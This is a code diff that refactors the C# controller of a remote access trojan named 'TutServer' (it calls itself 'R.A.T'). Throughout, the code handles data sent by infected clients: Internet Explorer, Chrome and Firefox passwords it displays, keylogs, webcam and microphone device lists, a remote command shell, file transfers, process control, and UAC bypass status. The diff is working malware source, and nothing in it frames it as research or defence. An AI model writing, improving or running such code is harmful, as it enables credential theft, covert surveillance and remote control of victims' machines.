+                        else if (text.StartsWith("fdrivel§")) //The client sent a list of drives
                         {
-                            String name = device.Split('|')[0]; //Get the name of the device
-                            String channel = device.Split('|')[1]; //Get the channel ID for the device
-                            AddAudio(name, channel); //Update the UI
-                            devices++; //Increment the count of devices
-                        }
-                        if (devices == 0) //If no devices
-                        {
-                            Msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
-                        }
-                    }
+                            string data = text.Substring(8); //Get the drive listing
 
-                    if (text.StartsWith("wlist")) //Client sent the list of installed web cams
-                    {
-                        LvClear(listView5); //Clear the web cam listView
-                        String data = text.Substring(5); //Remove the commmand header from the message
-                        int devices = 0; //Declare the count of devices
-                        foreach (String device in data.Split('§')) //Go through the devices
-                        {
-                            if (device == "") continue; //If the device is empty, then skip it
-                            String id = device.Split('|')[0]; //Get the ID of the device
-                            String name = device.Split('|')[1]; //Get the name of the device
-                            AddCam(id, name); //Update the UI
-                            devices++; //Incremen the count of the devices
-                        }
+                            LvClear(listView3); //Clear the listView for drives
 
-                        if (devices == 0) //If no devices installed
-                        {
-                            Msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
-                        }
-                    }
-
-                    if (text.StartsWith("setstart§")) //Client sent the R.A.T application working directory
-                    {
-                        String sap = text.Split('§')[1]; //Get the directory
-                        remStart = sap; //Set the start directory
-                    }
-
-                    if (text == "getpwu") //Client sent error because password fox is not found in the directory
-                    {
-                        System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(PwuNotification)); //Create a notify thread
-                        notify.Start(); //Start the thread
-                    }
-
-                    if (text.StartsWith("iepw")) //Client sent the Internet Explorer recovered passwords
-                    {
-                        String[] ieLogins = text.Split('\n'); //Get every IE logins
-                        if (ieLogins[1] == "failed") //If failed to recover, or none exists
-                        {
-                            Console.WriteLine("no ie logins"); //Debug Function
-                        }
-                        else
-                        {
-                            List<String> ielogin = ieLogins.ToList(); //Convert to logins to list
-                            ielogin.RemoveAt(0); //Remove the first item
-                            ieLogins = ielogin.ToArray(); //Convert the list back to the array
-
-                            foreach (String login in ieLogins) //Go through the logins
+                            foreach (string drive in data.Split('\n')) //Loop through the drives
                             {
-                                String[] src = login.Split('§'); //Split to data parts
-                                String user = src[0]; //Get the username
-                                String password = src[1]; //Get the password
-                                String url = src[2]; //Get the URL
-                                ListViewItem lvi = new ListViewItem
+                                if (!drive.Contains("|")) continue; //If incorrect drive, then skip it
+                                string[] driveData = drive.Split('|');
+                                string name = driveData[0]; //Get the label of the drive (C:, D:, E: etc.)
+                                string size = Convert(driveData[1]); //Get the total size of the drive
+
+                                AddFileCallback(name, size, "N/A", name); //Update the UI
+                            }
+                        }
+                        else if (text.StartsWith("fdirl")) //The client sent the list of entries in a directory
+                        {
+                            string data = text.Substring(5); //Remove the command header from the message
+                            string[] entries = data.Split('\n'); //Get the entries from the data
+
+                            for (int i = 0; i < entries.Length; i++) //Loop through every entry in the list
+                            {
+                                string entry = entries[i];
+                                if (entry == "") continue; //If the entry is empty then skip it
+                                string[] entryData = entry.Split('§');
+                                string name = entryData[0]; //Get the name of the entry
+                                string size = Convert(entryData[1]); //Get the total size of the entry
+                                string crtime = entryData[2]; //Get the creation time of the entry
+                                string path = entryData[3]; //Get the full path to the entry
+                                AddFileCallback(name, size, crtime, path); //Update the UI
+                            }
+                        }
+                        else if (text.StartsWith("backfile§")) //The client sent file contents to the editor
+                        {
+                            string content = text.Substring(9); //Get the content of the file
+                            StartEditor(content, me); //Start the editor window
+                        }
+                        else if (text == "fconfirm") //Client accepted to receive a file
+                        {
+                            // TODO: this won't work for big files, read the file by some small amount of bytes and stream it to the client
+                            byte[] databyte = File.ReadAllBytes(fup_local_path); //Get the bytes of the file
+                            SendBytesToTarget(databyte); //Send the file to the client
+                        }
+                        else if (text == "frecv") //Client confirmed that the file is uploaded
+                        {
+                            Msgbox("File Upload", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
+                        }
+                        else if (text.StartsWith("finfo§")) //Client sent info about a file we want to download
+                        {
+                            fdl_size = int.Parse(text.Substring(6)); //Get the size of the file
+                            recvFile = new byte[fdl_size]; //Create a new buffer for the file
+                            isFileDownload = true; //Set the file download flag
+                            SendToTarget("fconfirm"); //Notify the client to send the file
+                        }
+                        else if (text.StartsWith("f1§")) //The client sent the up1 directory in the tree
+                        {
+                            string dir = text.Substring(3); //Get the parent directory
+
+                            if (dir != "drive") GetParentDirectory(dir); //If it's not the drive list the update the file list
+                            else //If it's the drive list
+                            {
+                                CurrentPath = "drive"; //Set the current path to the drive listing
+                                SendToTarget("fdrive"); //List the drives
+                                LvClear(listView3); //Clear the file list
+                            }
+                        }
+                        else if (text.StartsWith("putklog")) //Client sent the keylog
+                        {
+                            string dump = text.Substring(7); //Remove the command header
+                            SetLog(dump); //Update the UI
+                        }
+                        else if (text.StartsWith("dclient")) //Client is going to disconnect
+                        {
+                            // TODO: look into client disconnection this seems like a hack from a quick glance
+                            Console.WriteLine("Client Disconnected"); //Debug Function
+                            dclient = true; //Set the disconnect flag
+                            SwitchTab(tabPage1); //Switch to the client selection module
+                            killtarget = GetSocket(current); //Get the id of the affected socket
+                            killSocket = current; //Set the affected socket
+                            if (controlClient == killtarget) //If the affected client is the controlled one
+                            {
+                                //TODO: write UI reset code
+                                RemotePipe[] rpArray = { null }; //Create a new remote pipe array
+                                sCore.RAT.ExternalApps.ClearIPCConnections(hostToken); //Clear the list of ipc connections for plugins
+                                Array.Copy(rPipeList.ToArray(), rpArray, rPipeList.Count); //Get the list of pipes
+                                foreach (RemotePipe rp in rpArray) //Go through each pipe in the list
                                 {
-                                    Text = url //Set the url
-                                }; //Create a new listView item
-                                lvi.SubItems.Add(user); //Set the username
-                                lvi.SubItems.Add(password); //Set the password
-                                LvAddItem(listView6, lvi, 1); //Set the item's group (1 = group Internet Explorer)
+                                    if (rp == null) continue; //If the pipe is closed, then skip it
+                                    rp.RemoteRemove = false; //Set the remove flag
+                                    ClosePipe(rp); //Close the remote pipe
+                                }
+
+                                rPipeList.Clear(); //Clear the list of pipes
+                            }
+                            int id = killtarget; //Declare the client id
+                            reScanTarget = true; //Set the rescan flag
+                            reScanStart = id; //Set the rescan starting id
+                            if (lcm != null) //If linux client manager is enabled
+                            {
+                                if (lcm.IsLinuxClient(id)) lcm.RemoveAssociation(id); //If it's a linux client, then remove it from the manager
+                            }
+                            Console.WriteLine("Timer Removed Client"); //Debug Function
+                            killSocket.Close(); //Close the affected socket
+                            _clientSockets.Remove(killSocket); //Remove the affected socket from the list
+                            RestartServer(id); //Restart the server
+                        }
+                        else if (text.StartsWith("alist")) //Client sent the list of audio devies of thier machine
+                        {
+                            LvClear(listView4); //Clear the audio devices listView
+                            string data = text.Substring(5); //Remove the command header from the message
+                            int devices = 0; //Declare the count of devices
+                            string[] deviceData = data.Split('§');
+                            for (int i = 0; i < deviceData.Length; i++) //Go through all devices
+                            {
+                                string device = deviceData[i];
+                                string[] deviceInfo = device.Split('|');
+                                string name = deviceInfo[0]; //Get the name of the device
+                                string channel = deviceInfo[1]; //Get the channel ID for the device
+                                AddAudio(name, channel); //Update the UI
+                                devices++; //Increment the count of devices
+                            }
+
+                            if (devices == 0) //If no devices
+                            {
+                                Msgbox("Warning", "No audio capture devices present on this target", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                             }
                         }
-                    }
-
-                    if (text.StartsWith("gcpw")) //Client sent Google Chrome Logins
-                    {
-                        String[] gcLogins = text.Split('\n'); //Get the logins
-                        if (gcLogins[1] == "failed") //If failed to recover or none exists
+                        else if (text.StartsWith("wlist")) //Client sent the list of installed web cams
                         {
-                            Console.WriteLine("no gc logins"); //Debug Function
-                        }
-                        else
-                        {
-                            List<String> gclogin = gcLogins.ToList(); //Convert the login to list
-                            gclogin.RemoveAt(0); //Remove the first item
-                            gcLogins = gclogin.ToArray(); //Convert the list back to the array
-
-                            foreach (String login in gcLogins) //Go through every login credentials
+                            // TODO: extract to method along with audio devices
+                            LvClear(listView5); //Clear the web cam listView
+                            string data = text.Substring(5); //Remove the commmand header from the message
+                            int devices = 0; //Declare the count of devices
+                            string[] deviceData = data.Split('§');
+                            for (int i = 0; i < deviceData.Length; i++) //Go through all devices
                             {
-                                String[] src = login.Split('§'); //Split the data to parts
-                                String user = src[1]; //Get the username
-                                String password = src[2]; //Get the password
-                                String url = src[0]; //Get the URL
-                                ListViewItem lvi = new ListViewItem
+                                string device = deviceData[i];
+                                if (device == "") continue; //If the device is empty, then skip it
+                                string[] deviceInfo = device.Split('|');
+                                string id = deviceInfo[0]; //Get the ID of the device
+                                string name = deviceInfo[1]; //Get the name of the device
+                                AddCam(id, name); //Update the UI
+                                devices++; //Incremen the count of the devices
+                            }
+
+                            if (devices == 0) //If no devices installed
+                            {
+                                Msgbox("Warning", "No video capture devices present on this target!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
+                            }
+                        }
+                        else if (text.StartsWith("setstart§")) //Client sent the R.A.T application working directory
+                        {
+                            remStart = text.Substring(9); //Get the directory
+                        }
+                        else if (text == "getpwu") //Client sent error because password fox is not found in the directory
+                        {
+                            System.Threading.Thread notify = new System.Threading.Thread(new System.Threading.ThreadStart(PwuNotification)); //Create a notify thread
+                            notify.Start(); //Start the thread
+                        }
+                        else if (text.StartsWith("iepw")) //Client sent the Internet Explorer recovered passwords
+                        {
+                            string[] ieLogins = text.Split('\n'); //Get every IE logins
+                            if (ieLogins[1] == "failed") //If failed to recover, or none exists
+                            {
+                                Console.WriteLine("no ie logins"); //Debug Function
+                            }
+                            else
+                            {
+                                for (int i = 0; i < ieLogins.Length; i++) //Go through the logins
                                 {
-                                    Text = url //Set the URL
-                                }; //Create a new listView item
-                                lvi.SubItems.Add(user); //Set the username
-                                lvi.SubItems.Add(password); //Set the password
-                                LvAddItem(listView6, lvi, 0); //Set the item's group (0 = group Google Chrome)
+                                    if (i == 0) continue; // Skip the first item (header)
+                                    string login = ieLogins[i];
+                                    string[] src = login.Split('§'); //Split to data parts
+                                    string user = src[0]; //Get the username
+                                    string password = src[1]; //Get the password
+                                    string url = src[2]; //Get the URL
+                                    ListViewItem lvi = new ListViewItem
+                                    {
+                                        Text = url //Set the url
+                                    }; //Create a new listView item
+                                    lvi.SubItems.Add(user); //Set the username
+                                    lvi.SubItems.Add(password); //Set the password
+                                    LvAddItem(listView6, lvi, 1); //Set the item's group (1 = group Internet Explorer)
+                                }
                             }
                         }
-                    }
-
-                    if (text.StartsWith("ffpw")) //Client sent Fire Fox logins
-                    {
-                        String[] ffLogins = text.Split('\n'); //Get the logins
-                        if (ffLogins[1] == "failed") //If failed to recover or none exists
+                        else if (text.StartsWith("gcpw")) //Client sent Google Chrome Logins
                         {
-                            Console.WriteLine("no ff logins"); //Debug Function
-                        }
-                        else
-                        {
-                            List<String> fflogin = ffLogins.ToList(); //Convert the logins to list
-                            fflogin.RemoveAt(0); //Remove the first item
-                            ffLogins = fflogin.ToArray(); //Convert the list back to array
-
-                            foreach (String login in ffLogins) //Go through the logins
+                            string[] gcLogins = text.Split('\n'); //Get the logins
+                            if (gcLogins[1] == "failed") //If failed to recover or none exists
                             {
-                                String[] src = login.Split('§'); //Split the data to parts
-                                String user = src[2]; //Get the username
-                                String password = src[3]; //Get the password
-                                String url = src[1]; //Get the URL
-                                ListViewItem lvi = new ListViewItem
+                                Console.WriteLine("no gc logins"); //Debug Function
+                            }
+                            else
+                            {
+                                for (int i = 0; i < gcLogins.Length; i++) //Go through every login credentials
                                 {
-                                    Text = url //Set the URL
-                                }; //Create a new listView item
-                                lvi.SubItems.Add(user); //Set the username
-                                lvi.SubItems.Add(password); //Set the password
-                                LvAddItem(listView6, lvi, 2); //Set the item's group (2 = group Firefox)
+                                    if (i == 0) continue; // Skip the first item (header)
+                                    string login = gcLogins[i];
+                                    string[] src = login.Split('§'); //Split the data to parts
+                                    string user = src[1]; //Get the username
+                                    string password = src[2]; //Get the password
+                                    string url = src[0]; //Get the URL
+                                    ListViewItem lvi = new ListViewItem
+                                    {
+                                        Text = url //Set the URL
+                                    }; //Create a new listView item
+                                    lvi.SubItems.Add(user); //Set the username
+                                    lvi.SubItems.Add(password); //Set the password
+                                    LvAddItem(listView6, lvi, 0); //Set the item's group (0 = group Google Chrome)
+                                }
                             }
                         }
-                    }
-
-                    if (text.StartsWith("error")) //If client sent error message
-                    {
-                        String code = text.Split('§')[1]; //Get the message's code
-                        String title = text.Split('§')[2]; //Get the message's title
-                        String message = text.Split('§')[3]; //Get the message's body
-                        label24.ForeColor = Color.Gold; //Set the text color to gold
-                        label24.BackColor = Color.Black; //Set the back color to read
-                        SetErrorText("Error " + code + "\n" + title + "\n" + message); //Set the error message
-                        ShowError(); //Update the UI
-                        Timer t = new Timer
+                        else if (text.StartsWith("ffpw")) //Client sent Fire Fox logins
                         {
-                            Interval = 10000 //Set the timer's frequency to 10 seconds
-                        }; //Create a new timer
-                        t.Tick += new EventHandler(DismissUpdate); //Set the tick handler
-                        t.Start(); //Start the timer
-                        /*if (title == "UAC Bypass")
-                        {
-                            msgbox("UAC Bypass Failed", "Please upload the core files to the directory the client is located in\r\n(" + remStart + ")", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                        }*/
-
-                        Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title); //Create a plugin error object
-
-                        sCore.RAT.ServerSettings.RaiseErrorEvent(eMsg); //Notify the plugins of the error
-                    }
-
-                    if (text.StartsWith("ipc§")) //Client sent IPC output message
-                    {
-                        string serverName = text.Split('§')[1]; //Get the IPC server's name
-                        string message = text.Substring(text.IndexOf('§') + 1); //Get the message body
-                        message = message.Substring(message.IndexOf('§') + 1); //Format the message
-
-                        foreach (RemotePipe rp in rPipeList) //Gor through the remote pipe list
-                        {
-                            if (rp.pname == serverName) //If the servers match
+                            string[] ffLogins = text.Split('\n'); //Get the logins
+                            if (ffLogins[1] == "failed") //If failed to recover or none exists
                             {
-                                rp.WriteOutput(message); //Write the output to the form
-                                break; //Break the loop
+                                Console.WriteLine("no ff logins"); //Debug Function
+                            }
+                            else
+                            {
+                                for (int i = 0; i < ffLogins.Length; i++) //Go through the logins
+                                {
+                                    if (i == 0) continue; // Skip the first item (header)
+                                    string login = ffLogins[i];
+                                    string[] src = login.Split('§'); //Split the data to parts
+                                    string user = src[2]; //Get the username
+                                    string password = src[3]; //Get the password
+                                    string url = src[1]; //Get the URL
+                                    ListViewItem lvi = new ListViewItem
+                                    {
+                                        Text = url //Set the URL
+                                    }; //Create a new listView item
+                                    lvi.SubItems.Add(user); //Set the username
+                                    lvi.SubItems.Add(password); //Set the password
+                                    LvAddItem(listView6, lvi, 2); //Set the item's group (2 = group Firefox)
+                                }
                             }
                         }
-                    }
+                        else if (text.StartsWith("error")) //If client sent error message
+                        {
+                            string[] errorData = text.Split('§');
+                            string code = errorData[1]; //Get the message's code
+                            string title = errorData[2]; //Get the message's title
+                            string message = errorData[3]; //Get the message's body
+                            label24.ForeColor = Color.Gold; //Set the text color to gold
+                            label24.BackColor = Color.Black; //Set the back color to read
+                            SetErrorText("Error " + code + "\n" + title + "\n" + message); //Set the error message
+                            ShowError(); //Update the UI
+                            // TODO: get rid of timer if we can (I think it hurts performance, and it's not elegant)
+                            Timer t = new Timer
+                            {
+                                Interval = 10000 //Set the timer's frequency to 10 seconds
+                            }; //Create a new timer
+                            t.Tick += new EventHandler(DismissUpdate); //Set the tick handler
+                            t.Start(); //Start the timer
 
-                    if (text == "uac§a_admin") //Client sent that it's running as admin
-                    {
-                        Msgbox("Warning", "R.A.T is already running in administrator mode!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
-                    }
+                            Types.ClientErrorMessage eMsg = new Types.ClientErrorMessage(code, message, title); //Create a plugin error object
 
-                    if (text == "uac§f_admin") //Client sent that UAC bypass core files are missing
-                    {
-                        EnableButton(button20, true); //Enable Auto download
-                        Msgbox("Error!", "UAC Bypass Core files not found!\r\nDownload and Compile them manually from the Bypass-Uac repo\r\nThen upload them to the target", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
-                    }
+                            sCore.RAT.ServerSettings.RaiseErrorEvent(eMsg); //Notify the plugins of the error
+                        }
+                        else if (text.StartsWith("ipc§")) //Client sent IPC output message
+                        {
+                            string serverName = text.Split('§')[1]; //Get the IPC server's name
+                            string message = text.Substring(4); //Get the message body
+                            message = message.Substring(message.IndexOf('§') + 1); //Format the message
+
+                            foreach (RemotePipe rp in rPipeList) //Gor through the remote pipe list
+                            {
+                                if (rp.pname == serverName) //If the servers match
+                                {
+                                    rp.WriteOutput(message); //Write the output to the form
+                                    break; //Break the loop
+                                }
+                            }
+                        }
+                        else if (text == "uac§a_admin") //Client sent that it's running as admin
+                        {
+                            Msgbox("Warning", "R.A.T is already running in administrator mode!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
+                        }
+                        else if (text == "uac§f_admin") //Client sent that UAC bypass core files are missing
+                        {
+                            EnableButton(button20, true); //Enable Auto download
+                            Msgbox("Error!", "UAC Bypass Core files not found!\r\nDownload and Compile them manually from the Bypass-Uac repo\r\nThen upload them to the target", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
+                        }
 #if EnableAutoLoad
                     if (text.StartsWith("uacload§")) //Client sent auto download progress
                     {
@@ -2669,7 +2647,8 @@ namespace TutServer //Main Namespace
                         }
                     }
 #endif
-                }
+                    }
+                } 
             }
            
 
@@ -2680,6 +2659,8 @@ namespace TutServer //Main Namespace
 #endregion
 
 #region Cross Thread Functions
+
+        // TODO: minimize the amount of delegate declarations (we can reuse them with a common name)
 
         /// <summary>
         /// Delegate used to set the remote desktop frame image
@@ -3238,7 +3219,7 @@ namespace TutServer //Main Namespace
             {
                 String command = "fdir§" + directory; //Construct the command
                 SendToTarget(command); //Send the command to the client
-                Current_Path = directory; //Set the current path
+                CurrentPath = directory; //Set the current path
                 listView3.Items.Clear(); //Clear the items of the file list
             }
         }
@@ -3305,9 +3286,9 @@ namespace TutServer //Main Namespace
         /// </summary>
         /// <param name="byt">The byte size of the file</param>
         /// <returns>The highest possible measurement of the size</returns>
-        private String Convert(String byt)
+        private string Convert(string byt)
         {
-            String stackName = "B"; //Declare the measurement id
+            string stackName = "B"; //Declare the measurement id
             //Console.WriteLine(byt);
 
             if (byt == "N/A") //Check if size is unknown
@@ -3324,33 +3305,26 @@ namespace TutServer //Main Namespace
                 {
                     div_result = bytes; //Return the bytes
                 }
-
-                if (bytes >= 1024 && bytes < (1024 * 1024)) //If it falls in range of kilo bytes
+                else if (bytes >= 1024 && bytes < (1024 * 1024)) //If it falls in range of kilo bytes
                 {
                     stackName = "KB"; //Set hte measurement id
                     div_result = bytes / 1024; //Convert the bytes to kilo bytes
                 }
-
-                if (bytes >= (1024 * 1024) && bytes < (1024 * 1024 * 1024)) //If it falls in range of mega bytes
+                else if (bytes >= (1024 * 1024) && bytes < (1024 * 1024 * 1024)) //If it falls in range of mega bytes
                 {
                     stackName = "MB"; //Set the measurement id
                     div_result = bytes / (1024 * 1024); //Convert the bytes to mega bytes
                 }
-
-                if (bytes >= (1024 * 1024 * 1024)) //If it's out of the mega byte range
+                else if (bytes >= (1024 * 1024 * 1024)) //If it's out of the mega byte range
                 {
                     stackName = "GB"; //Set the measurement id
                     div_result = bytes / (1024 * 1024 * 1024); //Convert the bytes to giga bytes
                 }
 
-                String value = div_result.ToString("0.00"); //Format the result for two decimals
-                String final = value + " " + stackName; //Construct the display string
-                return final; //Return the final result
+                return $"{div_result.ToString("0.00")} {stackName}"; // Return the result
             }
-            catch (Exception ) //Something went wrong
+            catch (Exception) //Something went wrong
             {
-               //Console.WriteLine(e);
-               // Console.WriteLine("files, converter error");
                return "ERROR"; //Return error
             }
         }
@@ -3995,10 +3969,10 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button3_Click(object sender, EventArgs e)
         {
-            String title = textBox1.Text; //Get the title text
-            String text = textBox2.Text; //Get the message text
-            String icons = comboBox1.SelectedItem.ToString(); //Get the selected icon
-            String buttons = comboBox2.SelectedItem.ToString(); //Get the selected button
+            string title = textBox1.Text; //Get the title text
+            string text = textBox2.Text; //Get the message text
+            string icons = comboBox1.SelectedItem.ToString(); //Get the selected icon
+            string buttons = comboBox2.SelectedItem.ToString(); //Get the selected button
             int ico = 0; //Declare int icon code
             int btn = 0; //Declare int button code
 
@@ -4051,9 +4025,13 @@ namespace TutServer //Main Namespace
             }
 
             //Construct data
-
-            String cmd = "msg|" + title + "|" + text + "|" + ico + "|" + btn; //Construct the command
-            SendToTarget(cmd); //Send the command to the client
+            StringBuilder sb = new StringBuilder();
+            sb.Append("msg|")
+                .Append(title).Append("|")
+                .Append(text).Append("|")
+                .Append(ico).Append("|")
+                .Append(btn).Append("|");
+            SendToTarget(sb.ToString()); //Send the command to the client
         }
 
         /// <summary>
@@ -4063,7 +4041,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button4_Click(object sender, EventArgs e)
         {
-            String cmd = "freq-" + textBox3.Text; //Construct the command
+            string cmd = "freq-" + textBox3.Text; //Construct the command
             SendToTarget(cmd); //Send the command to the client
         }
 
@@ -4074,8 +4052,8 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button5_Click(object sender, EventArgs e)
         {
-            String opt = comboBox3.SelectedItem.ToString(); //The system sound to play
-            String code = "0"; //The code of the sound
+            string opt = comboBox3.SelectedItem.ToString(); //The system sound to play
+            string code = "0"; //The code of the sound
 
             switch (opt) //Switch on opt
             {
@@ -4096,7 +4074,7 @@ namespace TutServer //Main Namespace
                     break;
             }
 
-            String cmd = "sound-" + code; //Construct the command
+            string cmd = "sound-" + code; //Construct the command
             SendToTarget(cmd); //Send the command to the client
         }
 
@@ -4107,9 +4085,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button6_Click(object sender, EventArgs e)
         {
-            String text = richTextBox1.Text; //Get the text to read
-            String cmd = "t2s|" + text; //Construct the command
-
+            string cmd = "t2s|" + richTextBox1.Text; //Construct the command
             SendToTarget(cmd); //Send to command to the client
         }
 
@@ -4120,8 +4096,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button12_Click(object sender, EventArgs e)
         {
-            String cmd = "cd|open"; //Construct the command
-
+            const string cmd = "cd|open"; //Construct the command
             SendToTarget(cmd); //Send the command to the client
         }
 
@@ -4132,8 +4107,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button13_Click(object sender, EventArgs e)
         {
-            String cmd = "cd|close"; //Construct the command
-
+            const string cmd = "cd|close"; //Construct the command
             SendToTarget(cmd); //Send the command to the client
         }
 
@@ -4145,7 +4119,7 @@ namespace TutServer //Main Namespace
         private void button7_Click(object sender, EventArgs e)
         {
             Control c = (Control)sender; //Get the sender control
-            String cmd = ""; //Declare command variable
+            string cmd = ""; //Declare command variable
 
             if (c.Text.Contains("Visible")) //If it's visible
             {
@@ -4169,7 +4143,7 @@ namespace TutServer //Main Namespace
         private void button8_Click(object sender, EventArgs e)
         {
             Control c = (Control)sender; //Get the sender control
-            String cmd = ""; //Declar the command
+            string cmd = ""; //Declar the command
 
             if (c.Text.Contains("Visible")) //If it's visible
             {
@@ -4192,8 +4166,9 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void button9_Click(object sender, EventArgs e)
         {
+            // TODO: extract code to separate function along with all elements related commands
             Control c = (Control)sender; //Get the sender control
-            String cmd = ""; //Declare the command
+            string cmd = ""; //Declare the command
 
             if (c.Text.Contains("Visible")) //If it's visible
             {
@@ -4217,7 +4192,7 @@ namespace TutServer //Main Namespace
         private void button10_Click(object sender, EventArgs e)
         {
             Control c = (Control)sender; //Get the sender control
-            String cmd = ""; //Declare the command
+            string cmd = ""; //Declare the command
 
             if (c.Text.Contains("Visible")) //If it's visible
             {
@@ -4241,7 +4216,7 @@ namespace TutServer //Main Namespace
         private void button11_Click(object sender, EventArgs e)
         {
             Control c = (Control)sender; //Get the sender control
-            String cmd = ""; //Declare the command
+            string cmd = ""; //Declare the command
 
             if (c.Text.Contains("Visible")) //If it's visible
             {
@@ -4264,7 +4239,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            String cmd = "proclist"; //Construct the command
+            const string cmd = "proclist"; //Construct the command
             listView2.Items.Clear(); //Clear the process list
             SendToTarget(cmd); //Send the command to the client
         }
@@ -4278,8 +4253,8 @@ namespace TutServer //Main Namespace
         {
             if (listView2.SelectedItems.Count > 0) //If a process is selected
             {
-                String id = listView2.SelectedItems[0].SubItems[1].Text; //get the process id
-                String cmd = "prockill|" + id; //Construct the command
+                string id = listView2.SelectedItems[0].SubItems[1].Text; //get the process id
+                string cmd = $"prockill|{id}"; //Construct the command
 
                 SendToTarget(cmd); //Send the command to the client
 
@@ -4298,7 +4273,7 @@ namespace TutServer //Main Namespace
         {
             if (textBox4.Text != "") //If process name isn't empty
             {
-                String cmd = "procstart|" + textBox4.Text + "|" + comboBox4.SelectedItem.ToString(); //Construct the command
+                string cmd = $"procstart|{textBox4.Text}|{comboBox4.SelectedItem.ToString()}"; //Construct the command
 
                 SendToTarget(cmd); //Send the command to the client
                 textBox4.Clear(); //Clear the process name box
@@ -4317,14 +4292,14 @@ namespace TutServer //Main Namespace
         {
             if (!IsCmdStarted) //If it's stopped
             {
-                String command = "startcmd"; //Construct the command
+                const string command = "startcmd"; //Construct the command
                 SendToTarget(command); //Send the command to the client
                 IsCmdStarted = true; //Set the cmd started flag
                 button15.Text = "Stop Cmd"; //Update the button
             }
             else
             {
-                String command = "stopcmd"; //Construct the command
+                const string command = "stopcmd"; //Construct the command
                 SendToTarget(command); //Send the command to the client
                 IsCmdStarted = false; //Set the cmd started flag to false
                 button15.Text = "Start Cmd"; //Update the button
@@ -4340,15 +4315,13 @@ namespace TutServer //Main Namespace
         {
             if (e.KeyCode == Keys.Return && IsCmdStarted) //If remote cmd is started and eneter is pressed
             {
-                String command = "cmd§" + textBox5.Text; //Construct the command
+                string command = $"cmd§{textBox5.Text}"; //Construct the command
                 textBox5.Text = ""; //Remove the text from the textBox
                 if (command == "cmd§cls" || command == "cmd§clear") //Filter screen clear commands
                 {
                     richTextBox2.Clear(); //Clear the screen locally
-                    return; //return
                 }
-
-                if (command == "cmd§exit") //If we need to exit
+                else if (command == "cmd§exit") //If we need to exit
                 {
                     //Ask the user for exitting from remote terminal or sending the exit command or doing nothing
                     DialogResult result = MessageBox.Show(this, "Do you want to exit from the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
@@ -4357,14 +4330,9 @@ namespace TutServer //Main Namespace
                         SendToTarget("stopcmd"); //Send command to the client
                         button15.Text = "Start Cmd"; //Update button
                         IsCmdStarted = false; //Set the cmd started flag to false
-                        return; //Return
-                    }
-                    else if (result == DialogResult.Cancel) //Dont' do anything
-                    {
-                        return; //Return;
                     }
                 }
-                SendToTarget(command); //Send the command to the client
+                else SendToTarget(command); //Send the command to the client
             }
             else if (e.KeyCode == Keys.Return && !IsCmdStarted) //If eneter is pressed and remote cmd is not started
             {
@@ -4379,7 +4347,7 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void listDrivesToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            String command = "fdrive"; //Construct the command
+            const string command = "fdrive"; //Construct the command
             SendToTarget(command); //Send the command to the client
         }
 
@@ -4392,16 +4360,16 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedIndices.Count > 0) //If and item is selected
             {
+                string path = listView3.SelectedItems[0].Text;
                 //if the item is not drive or a directory
-                if ((listView3.SelectedItems[0].SubItems[0].Text.Length != 3 && !listView3.SelectedItems[0].SubItems[0].Text.EndsWith(":\\")) && listView3.SelectedItems[0].SubItems[1].Text != "Directory")
+                if ((path.Length != 3 && !path.EndsWith(":\\")) || listView3.SelectedItems[0].SubItems[1].Text != "Directory")
                 {
                     MessageBox.Show(this, "The selected item is not a directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                     return; //Return
                 }
-                String fullPath = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory or drive
-                String command = "fdir§" + fullPath; //Construct the command
+                CurrentPath = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory or drive
+                string command = $"fdir§{CurrentPath}"; //Construct the command
                 SendToTarget(command); //Send the command to the client
-                Current_Path = fullPath; //Set the current path
                 listView3.Items.Clear(); //Clear the file list
             }
             else
@@ -4417,12 +4385,12 @@ namespace TutServer //Main Namespace
         /// <param name="e">The event args</param>
         private void toolStripMenuItem1_Click(object sender, EventArgs e)
         {
-            if (Current_Path == "drive") //If we reached the top
+            if (CurrentPath == "drive") //If we reached the top
             {
                 MessageBox.Show(this, "Action cancelled!", "You are at the top of the file tree!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                 return; //Return
             }
-            String cmd = "f1§" + Current_Path; //Construct the command
+            string cmd = $"f1§{CurrentPath}"; //Construct the command
             SendToTarget(cmd); //Send the command to the client
         }
 
@@ -4435,8 +4403,7 @@ namespace TutServer //Main Namespace
         {
             if (listView3.SelectedItems.Count > 0) //If an item is selected
             {
-                String path = listView3.SelectedItems[0].SubItems[3].Text; //Get the item's full path
-                xfer_path = path; //Store the path
+                xfer_path = listView3.SelectedItems[0].SubItems[3].Text; //Get the item's full path
                 xfer_mode = xfer_move; //Store the transfer mode
             }
         }
